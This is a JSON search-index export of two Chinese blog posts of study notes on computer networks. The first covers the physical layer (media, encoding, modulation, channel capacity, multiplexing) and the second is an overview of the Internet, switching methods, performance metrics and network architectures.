[{"title":"计算机网络-第二章-物理层","url":"/2021/09/30/计算机网络-第二章-物理层/","content":"\n# 物理层的基本概念\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(1).png\" style=\"zoom:80%;\" />\n\n物理层考虑的是怎样才能在连接各种计算机的传输媒体上**传输数据比特流**。\n\n<!-- more -->\n物理层为数据链路层屏蔽了各种传输媒体的差异，使数据链路层只需要考虑如何完成本层的协议和服务，而不必考虑网络具体的传输媒体是什么。\n\n物理层协议的主要任务：\n\n- **机械特性**：指明接口所用接线器的形状和尺寸，引脚数目和排列、固定和锁定装置；\n- **电气特性**：指明在接口电缆的各条线上出现的电压的范围；\n- **功能特性**：指明某条线.上出现的某一电平的电压表示何种意义；\n- **过程特性**：指明对于不同功能的各种可能事件的出现顺序。\n\n# 物理层下面的传输媒体\n\n**传输媒体**也称为传输介质或传输媒介，就是数据传输系统中在发送器和接收器之间的物理通路。\n\n**传输媒体**可分为两大类，即**导引型传输媒体**和**非导引型传输媒体。**\n\n> 传输媒体不属于计算机网络体系结构的任何一层，如果非要将它添加到体系结构中，那只能将其放置到物理层之下。\n\n## **导引型传输媒体**\n\n在导引型传输媒体中，电磁波被导引沿着固体媒体传播。\n\n---\n\n**同轴电缆：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(2).png\" style=\"zoom: 67%;\" />\n\n- 基带同轴电缆(50Ω)：数字传输，过去用于局域网\n- 宽带同轴电缆(75Ω)：模拟传输，目前主要用于有线电视\n\n同轴电缆价格较贵且布线不够灵活和方便，随着集线器的出现，在局域网领域基本上都是采用双绞线作为传输媒体。\n\n---\n\n**双绞线：**\n\n用两根线绞合的作用在于：\n\n- 抵御部分来自外界的电磁波干扰\n- 减少相邻导线的电磁干扰\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(3).png\" style=\"zoom:80%;\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(4).png\" style=\"zoom:80%;\" />\n\n---\n\n**光纤：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(5).png\" style=\"zoom: 67%;\" />\n\n光纤的优点：\n\n- 通信容量大 (25000~ 30000GHz的带宽)；\n- 传输损耗小，远距离传输时更加经济；\n- 抗雷电和电磁干扰性能好。这在大电流脉冲干扰的环境下尤为重要；\n- 无串音干扰，保密性好，不易被窃听；\n- 体积小， 重量轻。\n\n光纤的缺点：\n\n- 割接需要专用设备。\n\n> 光纤的工作原理：光纤外层为低折射率的包层，内层为高折射率的纤芯，光线在纤芯中传输的方式就是不断地全反射。\n\n**多模光纤**\n\n- 可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为**多模光纤**。\n\n**单模光纤**\n\n- 若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射。这样的光纤称为**单模光纤**。\n\n## **非导引型传输媒体**\n\n非导引型传输媒体是指自由空间。\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(6).png\" style=\"zoom:80%;\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(7).png\" style=\"zoom:80%;\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(8).png\" style=\"zoom:80%;\" />\n\n**无线电波：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(9).png\" style=\"zoom:80%;\" />\n\n**微波：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(10).png\" style=\"zoom:80%;\" />\n\n**红外线：**\n\n在早期，计算机之间使用过红外线通信，其特点是可以实现点对点无线传输，但只能直线传输，中间不能有障碍物，传输距离短，传输速率比较低(4Mb/s~16Mb/s)。\n\n如今已经被淘汰，但在许多手机中仍能见到这个功能，一般可以用红外通信遥控电器等。\n\n---\n\n扩展：这些频段的划分都由专门的**无线电频谱管理机构**来完成。\n\n- 中国:工业和信息化部无线电管理局(国家无线电办公室)\n- 美国:联邦通讯委员会FCC\n  ISM (Industrial, Scientific, Medical)频段\n  \n    <img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(11).png\" style=\"zoom:80%;\" />\n\n# 传输方式\n\n## 串行传输与并行传输\n\n**串行传输**：\n\n- 数据是一个比特一个比特依次发送的，因此在发送端与接收端之间，只需要一条数据传输线路即可。\n\n**并行传输**：\n\n- 一次发送n个比特，因此，在发送端和接收端之间需要有n条传输线路；\n- 并行传输的优点是比串行传输的速度n倍，但成本高。\n\n> 数据在传输线路上的传输采用是**串行传输**，计算机内部的数据传输常用**并行传输。**\n\n## 同步传输与异步传输\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(12).png\" style=\"zoom:80%;\" />\n\n**同步传输**：\n\n- 数据块以稳定的比特流的形式传输，**字节之间没有间隔**；\n- 接收端在每个比特信号的**中间时刻进行检测**，以判别接收到的是比特0还是比特1\n- 由于不同设备的时钟频率存在一定差异，不可能做到完全相同，在传输大量数据的过程中，所产生的判别时刻的累计误差，会导致接收端对比特信号的判别错位，所以要**使**收发双发**时钟保持同步。**\n\n收发双方时钟同步的方法：\n\n- 外同步：在收发双方之间添加一条单独的时钟信号线\n- 内同步：发送端将时钟同步信号编码到发送数据中一起传输(如曼彻斯特编码)\n\n---\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(13).png\" style=\"zoom:80%;\" />\n\n**异步传输**：\n\n- 以字节为独立的传输单位，字节之间的时间间隔不固定 (**字节之间异步**)；\n- 接收端仅在每个字节的起始处对**字节内的比特实现同步**，各比特的持续时间相同；\n- 通常在每个字节前后分别加上起始位和结束位。\n\n## 单工、半双工与全双工\n\n在许多情况下，我们要使用“**信道（channel）**”这一名词。信道和电路并不等同。信道一般都是用来表示向某一个方向传送信息的媒体。因此，一条通信电路往往包含一条发送信道和一条接收信道。\n\n从通信的双方信息交互的方式来看，可以有以下三种基本方式：\n\n**单向通信**：\n\n又称为**单工通信**，即只能有一个方向的通信而没有反方向的交互。\n例子：无线电广播、有线电广播、电视广播。\n\n**双向交替通信**：\n\n又称为**半双工通信**，即通信的双方可以发送信息，但不能双方同时发送（当然也就不能同时接收）。\n例子：对讲机。\n\n**双向同时通信**：\n\n又称为**全双工通信**，即通信的双发可以同时发送和接收信息。\n例子：手机等。\n\n注：严格来说，传输媒体并不能和信道划等号，单向通信只需要一条信道，而双向交替通信或双向同时通信则需要两条信道（每个方向各一条），其中**双向同时通信**的传输效率最高（如果使用信道复用技术，一条传输媒体还可以包含多个信道）\n\n# 编码与调制\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(14).png\"  />\n\n## 常用术语\n\n- **数据 (data)** —— 运送消息的实体；\n- **信号 (signal)** —— 数据的电气的或电磁的表现；\n- **模拟信号 (analogous signal)** —— 代表消息的参数的取值是连续的；\n- **数字信号 (digital signal)** —— 代表消息的参数的取值是离散的；\n- **码元 (code)** —— 在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形；\n- **基带信号**（即基本频带信号）—— 来自信源的信号；\n  像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。\n    - 基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行**调制**(modulation)\n\n在计算机网络中，常见的是将**数字基带信号**通过编码或调制的方法在相应信道进行传输。\n\n## 常用编码\n\n**不归零编码：**\n\n- 正电平表示比特1或0 | 负电平表示比特0或1\n- 所谓不归零编码，就是指在整个码元时间内，电平不会出现零电平。\n\n**实际比特1和比特0的表示要看现实怎么规定；**\n\n那么问题来了，多个1或多个0传输时，如何判断其比特数量？\n\n这就需要发送方的发送和接收方的接收做到严格的同步。\n\n- 用**一根额外传输线来传输时钟信号**，使发送方和接收方同步，接收方按时钟信号的节拍来逐个接收码元；\n- **但是**对于计算机网络，**宁愿利用这根传输线传输数据信号**，而不是传输时钟信号；\n\n由于不归零编码**存在同步问题**，因此计算机网络中的数据传输不采用这类编码！\n\n---\n\n**归零编码：**\n\n- **每个码元传输结束后信号都要“归零”**，所以接收方只要在信号归零后进行采样即可，不需要单独的时钟信号。\n- 实际上，归零编码相当于把时钟信号用\"归零”方式编码在了数据之内,这称为“自同步”信号。\n- 但是，归零编码中大部分的**数据带宽**，都用来传输“归零”而浪费掉了。\n\n所以归零编码虽然**自同步**，但是**编码效率低**。\n\n---\n\n**曼彻斯特编码：**\n\n- 在每个码元时间的中间时刻，信号都会发生跳变\n- 负跳变表示比特1或0 | 正跳变表示比特0或1\n- 码元中间时刻的跳变即表示时钟，又表示数据\n\n**实际比特1和比特0的表示要看现实怎么规定**\n\n> 传统以太网(10Mb/s)使用的就是曼切斯特编码\n\n---\n\n**差分曼彻斯特编码**\n\n- 在每个码元时间的中间时刻，信号都会发送跳变，但与曼彻斯特不同\n- **跳变仅表示时钟，码元开始处电平是否变换表示数据**\n- 变化表示比特1或0 | 不变化表示比特0或1\n\n**实际比特1和比特0的表示要看现实怎么规定**\n\n相比之下比曼彻斯特编码变化少，更适合较高的传输速率\n\n---\n\n## 调制\n\n- 数字信号转换为模拟信号，在模拟信道中传输。\n例如WiFi，采用补码键控CCK/直接序列扩频DSSS/正交频分复用OFDM等**调制**方式。\n- 模拟信号转换为另一种模拟信号，在模拟信道中传输。\n例如，语音数据加载到模拟的载波信号中传输。频分复用FDM技术，充分利用带宽资源。\n\n**基本调制方法：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(15).png\" style=\"zoom:80%;\" />\n\n- **调幅AM**：所调制的信号由两种不同振幅的基本波形构成。每个基本波形只能表示1比特信息量。\n- **调频FM**：所调制的信号由两种不同频率的基本波形构成。每个基本波形只能表示1比特信息量。\n- **调相PM**：所调制的信号由两种不同初相位的基本波形构成。每个基本波形只能表示1比特信息量。\n\n注：使用基本调制方法，1个码元只能包含1个比特信息\n\n---\n\n**混合调制：**\n\n为使码元能够表示更多信息，我们引入混合调制，切入点便是将振幅、频率和相位结合：\n\n- 因为频率和相位是相关的，即频率是相位随时间的变化率。所以一次只能调制频率和相位两个中的一个；\n- 然而相位和振幅不相关，可以将其结合起来一起调制，称为**正交振幅调制QAM**\n\n举例：\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(16).png\" style=\"zoom:80%;\" />\n\n注：每个点代表一个码元，可将码元的极坐标角度看作相位，半径看作振幅。\n\n# 信道的极限容量\n\n- 任何实际的信道都不是理想的，在传输信号时会产生各种失真以及带来多种干扰。\n- 码元传输的速率越高，或信号传输的距离越远，或噪声干扰越大，或传输媒体质量越差，在信道的输出端的波形的失真就越严重。\n\n---\n\n**奈氏准则：在假定的理想条件下，为了避免码间串扰，码元传输速率是有上限的。**\n\n- 理想低通信道的最高码元传输速率= 2W Baud = 2W 码元/秒\n- 理想带通信道的最高码元传输速率= W Baud = W码元/秒\n    - W:信道带宽(单位为Hz)，Baud:波特,即码元/秒\n- 码元传输速率又称为波特率、调制速率、波形速率或符号速率。它与比特率有一定关系：\n    - 当1个码元只携带1比特的信息量时，则波特率(码元/秒)与比特率(比特/秒)在数值上是相等的；\n    - 当1个码元携带n比特的信息量时，则波特率转换成比特率时，数值要乘以n\n- 要提高信息传输速率(比特率)，就必须设法使每一个码元能携带更多个比特的信息量。这需要采用多元制。\n- 实际的信道所能传输的最高码元速率，要明显低于奈氏准则给出的这个上限数值。\n\n---\n\n**香农公式：带宽受限且有高斯白噪声干扰的信道的极限信息传输速率。**\n\n$$\nc=W\\times \\log_{2}{(1+\\frac{S}{N})}\n$$\n\nc：信道的极限信息传输速率(单位: b/s)\n\nW：信道带宽(单位: Hz)\n\nS：信道内所传信号的平均功率\n\nN：信道内的高斯噪声功率\n\nS/N：信噪比，使用分贝(dB) 作为度量单位，信噪比(dB) =10 x log(S/N) (dB)\n\n可见 信道带宽W 或 信噪比S/N 越大，信息的极限传输速率越高。\n\n在实际信道上能够达到的信息传输速率要比该公式的极限传输速率低不少。\n这是因为在实际信道中，信号还要受到其他一些损伤，如各种脉冲干扰、信号在传输中的衰减和失真等，这些因素在香农公式中并未考虑。\n\n---\n\n在信道带宽一定的情况下，根据奈氏准则和香农公式，要想提高信息的传输速率就必须采用**多元制**(更好的调制方法) 和 努力**提高信道中的信噪比。**\n\n> 自从香农公式发表后，各种新的信号处理和调制方法就不断出现，其目的都是为了尽可能地接近香农公式给出的传输速率极限。\n\n# 信道复用技术\n\n复用 (multiplexing) 是通信技术中的基本概念。它允许用户使用一个共享信道进行通信，降低成本，提高信道利用率。\n\n---\n\n**频分复用 FDM (Frequency Division Multiplexing)**\n\n- 将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带；\n- **频分复用**的所有用户在同样的时间**占用不同的带宽资源**（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）\n\n---\n\n**时分复用TDM (Time Division Multiplexing)**\n\n- **时分复用**则是将时间划分为一段段等长的**时分复用帧（TDM帧）**。每一个时分复用的用户在每一个 TDM 帧中占用**固定序号**的时隙；\n- 每一个用户所占用的时隙**周期性地出现**（其周期就是TDM帧的长度）\n- TDM 信号也称为**等时** (isochronous) 信号。\n- **时分复用的所有用户在不同的时间占用同样的频带宽度。**\n\n> **时分复用可能会造成线路资源的浪费：**\n> \n> \n> 使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。\n\n为此提出的改进方案是**统计时分复用 STDM (Statistic TDM)**\n\n- STDM帧**不是固定分配**时隙，而是**按需动态地**分配时隙。因此统计时分复用可以提高线路的利用率。\n\n---\n\n**波分复用 WDM(Wavelength Division Multiplexing)**\n\n- 波分复用就是光的频分复用。\n- 使用一根光纤来同时传输多个光载波信号。\n\n---\n\n**码分复用 CDM(Code Division Multiplexing)**\n\n- 常用的名词是**码分多址** CDMA (Code Division Multiple Access)。\n- 各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。\n- 这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。","tags":["计算机网络"],"categories":["计算机网络"]},{"title":"计算机网络-第一章-概述","url":"/2021/09/29/计算机网络-第一章-概述/","content":"\n- 计算机网络已由一种**通信基础设施**发展成为一种重要的**信息服务基础设施**\n- 计算机网络已经像水，电，煤气这些基础设施一样，成为我们**生活中不可或缺**的一部分\n\n<!-- more -->\n\n# 因特网概述\n\n## **网络、互连网和因特网**\n\n**网络(Network)** ：网络由若干**结点（Node）**和连接这些结点的**链路（Link）**组成。\n\n**互连网(internet)** ：多个网络通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即互连网。因此，互连网又称为 网络的网络（Network of Networks）。\n\n**因特网(Internet)** ：因特网是世界上最大的互连网络（用户数以亿计，互连的网络数以百万计）。\n\ninternet与Internet的区别：\n\n- internet(互连网)是一个**通用名词**，它泛指多个计算机网络互连而成的网络。在这些网络之间的通信协议可以是任意的。\n- Internet(因特网)则是一个**专用名词**，它指当前全球最大的、开放的、由众多网络互连而成的特定计算机网络，它采用**TCP/IP协议族**作为通信的规则，其前身是美国的ARPANET。\n\n相似之处是两者都是网络的网络。\n\n---\n\n## 因特网发展的三个阶段\n\n1969年 从单个网络ARPANET向互联网发展：\n\n- 1969年，第一个分组交换网**ARPANET**；\n- 70年代中期，研究多种网络之间的互连；\n- 1983年，**TCP/IP协议**成为ARPANET的标准协议\n（这也就是因特网的诞生时间）\n\n1985年 逐步建成三级结构的因特网：\n\n- 1985年，NSF围绕六个大型计算机中心建设**NSFNET** (主干网、地区网和校园网) ；\n- 1990年，ARPANET任务完成，正式关闭；\n- 1991年，美国政府将因特网主干网交给私人公司经营，并开始对接入因特网的单位收费；\n\n1993年 逐步形成了多层次ISP结构的因特网\n\n- 1993年，NSFNET逐渐被若干个商用因特网主干网替代；\n政府机构不再负责因特网运营，让各种**因特网服务提供者ISP**来运营；\n- 1994年，万维网WWW技术促使因特网迅猛发展；\n- 1995年，NSFNET停止运作，因特网彻底商业化。\n  \n    ---\n\n**因特网服务提供者 ISP(Internet Service Provider)**\n\nISP可以从因特网管理机构申请到成块的IP地址，同时拥有通信线路以及路由器等联网设备。任何机构和个人只需缴纳费用，就可从**ISP的得到所需要的IP地址**。\n\n- 一旦某个用户能够接入到因特网，那么他也可以成为一个ISP，所需要做的就是购买一些如调制解调器或路由器这样的设备，让其他用户可以和他相连。\n\n> 普通用户需要通过ISP才能接入因特网\n\n中国的三大ISP：中国电信，中国联通和中国移动\n\n- **基于ISP的三层结构的因特网**\n  \n    <img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(1).png\" style=\"zoom:80%;\" />\n\n## 因特网的标准化工作\n\n因特网的标准化工作对因特网的发展起到了非常重要的作用。\n\n因特网在制定其标准上的一个很大的特点是**面向公众。**\n\n- 因特网所有的**RFC**(Request For Comments)技术文档都可从因特网上免费下载；\n- 任何人都可以随时用电子邮件发表对某个文档的意见或建议。\n\n**因特网协会ISOC**是一个国际性组织，它负责对因特网进行全面管理，以及在世界范围内促进其发展和使用。\n\n- 因特网体系结构委员会IAB，负责管理因特网有关协议的开发；\n- 因特网工程部IETF，负责研究中短期工程问题，主要针对协议的开发和标准化；\n- 因特网研究部IRTF，从事理论方面的研究和开发一些需要长期考虑的问题。\n\n## 因特网的组成\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(2).png\" style=\"zoom:80%;\" />\n\n边缘部分：\n\n- 由所有连接在因特网上的**主机**组成（台式电脑，大型服务器，笔记本电脑，平板，智能手机等）。\n- 这部分是**用户直接使用**的，用来进行**通信**（传送数据、音频或视频）和**资源共享**。\n\n核心部分：\n\n- 由**大量网络**和连接这些网络的**路由器**组成。\n- 这部分是**为边缘部分提供服务**的（提供连通性和交换）。\n\n扩展：\n\n路由器是一种专用计算机，但我们不称它为主机，路由器是实现分组交换的关键构建，其任务是转发收到的分组，这是网络核心最重要的部分。\n\n处在互联网边缘的部分就是连接在互联网上的所有的主机。这些主机又称为**端系统 (end system)**。\n\n**端系统在功能上可能有很大的差别：**\n\n1. 小的端系统可以是一台普通个人电脑，具有上网功能的智能手机，甚至是一个很小的网络摄像头。\n2. 大的端系统则可以是一台非常昂贵的大型计算机。\n3. 端系统的拥有者可以是个人，也可以是单位（如学校、企业、政府机关等），当然也可以是某个ISP。\n\n## 端系统的通信方式\n\n**端系统之间通信的含义：**\n\n主机 A 和主机 B 进行通信 实际上是指：\n\n- 运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进行通信；\n- **即主机** **A** **的某个进程和主机** **B** **上的另一个进程进行通信。简称为“计算机之间通信”。**\n\n端系统之间的通信方式通常可划分为两大类：\n\n**客户-服务器方式(C/S方式)：**\n\n- 客户 (client) 和服务器 (server) 都是指通信中所涉及的两个**应用进程；**\n- 客户-服务器方式所描述的是进程之间服务和被服务的关系；\n- 客户是服务的请求方，服务器是服务的提供方。\n\n注：服务请求方和服务提供方都要使用网络核心部分所提供的服务。\n\n**对等连接方式(P2P方式)：**\n\n- **对等连接**(peer-to-peer)是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方；\n- 只要两个主机都运行了对等连接软件(P2P 软件)，它们就可以进行**平等的、对等连接通信**。\n- 双方都可以下载对方已经存储在硬盘中的共享文档。\n\n# 三种交换方式\n\n网络核心部分是互联网中最复杂的部分。因为网络中的核心部分要向网络边缘中的大量主机提供连通性，使边缘部分中的任何一个主机都能够向其他主机通信（即传送或接收各种形式的数据）。\n\n在网络核心部分中起特殊作用的设备是**路由器**(router)。\n\n**路由器**是实现**分组交换** (packet switching) 的关键构件，其任务是**转发**收到的分组，这是网络核心部分最重要的功能。\n\n下面介绍三种常见的数据交换方式\n\n## **电路交换(Circuit Switching)**\n\n起初数据交换较多发生在电话使用上，最早电话之间采用两两相连的方式，拓扑图上看来就是一个完全图，如此一来，电话数量很多时，电话线也就有很多很多，很不方便。\n\n为使得每一部电话能够很方便地和另一部电话进行通信，就应该使用一个**中间设备**将这些电话连接起来，这个中间设备就是**电话交换机。**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(3).png\" style=\"zoom: 50%;\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(4).png\" style=\"zoom: 67%;\" />\n\n- 电话交换机接通电话线的方式称为电路交换；\n- 从通信资源的分配角度来看，交换（Switching）就是按照某种方式动态地分配传输线路的资源；\n- 电路交换的三个步骤：\n    1. 建立连接（分配通信资源）\n    2. 通话（一直占用通信资源）\n    3. 释放连接（归还通信资源）\n\n当使用电路交换来传送计算机数据时，其线路的传输效率往往很低，这是因为计算机数据是突发式地出现在传输线路上的。\n\n所以计算机通常采用的是**分组交换**，而不是线路交换。\n\n## **分组交换(Packet Switching)**\n\n通常我们把表示**该消息的整块数据称为**一个**报文**。\n\n在发送报文之前，先把较长的报文划分成一个个更小的**等长数据段**，在每一个数据段前面。加上一些由**必要的控制信息组成的首部**后，就构成一个分组，也可简称为“包”，相应地，首部也可称为“包头”。\n\n首部包含了**分组的目的地址，**分组从源主机到目的主机，可走不同的路径。\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(5).png\" style=\"zoom:80%;\" />\n\n- 发送方：构造分组 | 发送分组\n- 路由器：缓存分组 | 转发分组，简称为“存储转发”\n  \n    在路由器中的输入和输出端口之间没有直接连线。\n    \n    路由器处理分组的过程是：\n    \n    1. 把收到的分组先**放入缓存（暂时存储）；**\n    2. **查找转发表**，找出到某个目的地址应从哪个端口转发；\n    3. 把分组送到适当的端口**转发**出去。\n- 接收方：接收分组 | 还原报文\n\n## 报文交换(**Message Switching**)\n\n报文交换中的交换结点也采用存储转发方式，但报文交换对报文的**大小没有限制**，这就要求交换结点需要较大的缓存空间。报文交换主要用于早期的电报通信网，现在较少使用，**通常被较先进的分组交换方式所取代**。\n\n## 三种交换方式的对比\n\n假设A，B，C，D是分组传输路径所要经过的4个结点交换机，纵坐标为时间\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(6).png\" style=\"zoom:80%;\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(7).png\" style=\"zoom:80%;\" />\n\n分析：\n\n电路交换：\n\n- 通信之前首先要建立连接；\n连接建立好之后，就可以使用已建立好的连接进行数据传送；\n数据传送后，需释放连接，以归还之前建立连接所占用的通信线路资源。\n- 一旦建立连接，中间的各结点交换机就是直通形式的，比特流可以直达终点；\n\n报文交换：\n\n- 可以随时发送报文，而不需要事先建立连接；\n**整个报文**先传送到相邻结点交换机，全部存储下来后进行查表转发，转发到下一个结点交换机；\n- 整个报文需要在各结点交换机上进行存储转发，由于不限制报文大小，因此需要各结点交换机都具有较大的缓存空间；\n\n分组交换：\n\n- 可以随时发送分组，而不需要事先建立连接；\n构成原始报文的一个个分组，依次在各结点交换机上存储转发；\n各结点交换机在发送分组的同时，还缓存接收到的分组；\n- 构成原始报文的一个个分组，在各结点交换机上进行存储转发，相比报文交换，减少了转发时延，还可以避免过长的报文长时间占用链路，同时也有利于进行差错控制。\n\n# **计算机网络的定义和分类**\n\n## **定义**\n\n计算机网络的精确定义并未统一\n\n计算机网络的最简单的定义是：一些**互**相**连**接的、**自治**的计算机的**集合**。\n\n- 互连：是指计算机之间可以通过有线或无线的方式进行数据通信；\n- 自治：是指独立的计算机，拥有自己的硬件和软件，可以单独运行使用；\n- 集合：是指至少需要两台计算机；\n\n计算机网络的较好的定义是：计算机网络主要是由一些**通用的、可编程的硬件（一定包含有中央处理机CPU）互连**而成的，而这些硬件并非专门用来实现某一特定目的（例如，传送数据或视频信号）。这些可编程的硬件能够用来**传送多种不同类型的数据**，并能**支持广泛的和日益增长的应用**。\n\n- 计算机网络所连接的硬件，并不限于一般的计算机，而是包括了智能手机等智能硬件。\n- 计算机网络并非专门用来传送数据，而是能够支持很多种的应用（包括今后可能出现的各种应用）。\n\n## 分类\n\n**按交换技术分类：**\n\n- 电路交换网络\n- 报文交换网络\n- 分组交换网络\n\n**按使用者分类：**\n\n- 公用网\n- 专用网\n\n**按传输介质分类：**\n\n- 有线网络\n- 无线网络\n\n**按覆盖范围分类：**\n\n- 广域网WAN（Wide Area Network）\n\n作用范围通常为几十到几千公里，因而有时也称为远程网（long haul network）。广域网是互联网的核心部分，其任务是通过长距离（例如，跨越不同的国家）运送主机所发送的数据。\n\n- 城域网MAN\n\n作用范围一般是一个城市，可跨越几个街区甚至整个城市\n\n- 局域网LAN\n\n一般用微型计算机或工作站通过高速通信线路相连（速率通常在 10 Mbit/s 以上），但地理上范围较小（1 km 左右）\n\n- 个域网PAN\n\n就是在个人工作的地方把个人使用的电子设备用无线技术连接起来的网络。\n\n**按拓扑结构分类：**\n\n- 总线型网络\n- 星型网络\n- 环形网络\n- 网状型网络\n\n# 计算机网络的性能指标\n\n## 速率\n\n连接在计算机网络上的主机在数字信道上传送比特的速率，也称为**比特率**或数据率。\n\n常用数据率单位：bit/s, b/s, bps \n注：速率中的 1 kb/s=1000 bps，数据中的 1 kB=1024 B.\n\n## 带宽\n\n带宽在模拟信号系统中的意义：\n\n- 指信号所包含的各种不同频率成分锁占据的频率范围\n- 单位：Hz ( kHz, MHz, GHz )\n\n带宽在计算机网络中的意义：\n\n- 用来表示网络的通信线路所能传送数据的能力\n- 网络带宽表示在单位时间内从网络中的某一点到另一点所能通过的 **最高比特率**\n- 单位：b/s ( kb/s,  Mb/s, Gb/s, Tb/s)\n\n## 吞吐量\n\n吞吐量表示在单位时间内通过某个网络(或信道、接口)的**数据量**。\n\n- 吞吐量经常被用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络；\n- 吞吐量受网络的带宽或额定速率的限制。\n\n带宽1 Gb/s的以太网，代表其**额定速率**是1 Gb/s，这个数值也是该以太网的**吞吐量的绝对上限值**。\n因此，对于带宽1 Gb/s的以太网，可能实际吞吐量只有 700 Mb/s，甚至更低。\n\n注意：吞吐量还可以用每秒传送的字节数或帧数表示\n\n## **时延**\n\n时延是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。\n\n网络时延由几部分组成：\n\n**发送时延**\n\n- 主机或路由器发送数据帧所需要的时间，也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。\n- 发送时延 = 分组长度(b) / 发送速率(b/s)\n\n**传播时延**\n\n- 电磁波在信道中传播一定的距离需要花费的时间。\n- 传播时延 = 信道长度(m) / 电磁波传播速率(m/s)\n    - 电磁波传播速率：\n    自由空间：3*10^8 m/s\n    铜线：2.3*10^8 m/s\n    光纤：2.0*10^8 m/s\n\n**处理时延**\n\n- 主机或路由器在收到分组时要花费一定时间进行处理\n- 一般不方便计算\n\n**排队时延**\n\n- 分组在进过网络传输时，要经过许多路由器。但分组在进入路由器后要先在输入队列中排队等待处理。\n- 有时会把排队时延看成 **处理时延 的一部分**\n\n总时延 = 发送时延 + 传播时延 + 处理时延 （处理时延 + 排队时延）\n\n## **时延带宽积**\n\n时延带宽积 = 传播时延 * 带宽\n\n- 若发送端连续发送数据，则在所发送的第一个比特即将到达终点时，发送端就已经发送了时延带宽积个比特；\n- 链路的时延带宽积又称为**以比特为单位的链路长度**。\n\n## **往返时间**\n\n互联网上的信息不仅仅单方向传输而是双向交互的。\n\n我们有时很需要知道**双向交互一次所需的时间**，因此**往返时间RTT(Round-Trip Time)**也是一个重要的性能指标。\n\n## **利用率**\n\n利用率有**信道利用率**和**网络利用率**两种。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(8).png)\n\n## **丢包率**\n\n丢包率即分组丢失率，是指在一定的时间范围内，传输过程中丢失的分组数量与总分组数量的比率。\n\n丢包率具体可分为接口丢包率、结点丢包率、链路丢包率、路径丢包率、网络丢包率等。\n丢包率是网络运维人员非常关心的一个网络性能指标，但对于普通用户来说往往并不关心这个指标，因为他们通常意识不到网络丢包。\n\n分组丢失主要有两种情况：\n\n- 分组在传输过程中出现误码，被结点丢弃；\n- 分组到达一台队列已满的分组交换机时被丢弃；\n在通信量较大时就可能造成网络拥塞。\n\n因此， 丢包率反映了网络的拥塞情况：\n\n- 无拥塞时路径丢包率为0\n- 轻度拥塞时路径丢包率为1%~4%\n- 严重拥塞时路径丢包率为5%~15%\n\n# 计算机网络体系结构\n\n## 常见计算机网络体系结构\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(9).png\" style=\"zoom: 50%;\" />\n\n如今用的最多的是TCP/IP体系结构，现今规模最大的、覆盖全球的、基于TCP/IP的互联网并未使用OSI标准。\n\nTCP/IP体系结构相当于将OSI体系结构的**物理层**和**数据链路层**合并为了**网络接口层**，并去掉了**会话层**和**表示层**。\n\nTCP/IP在网络层使用的协议是IP协议，IP协议的意思是网际协议，因此**TCP/IP体系结构的网络层称为网际层**\n\n扩展：一般来说路由器只包含网络接口层和网际层\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(10).png\" style=\"zoom:80%;\" 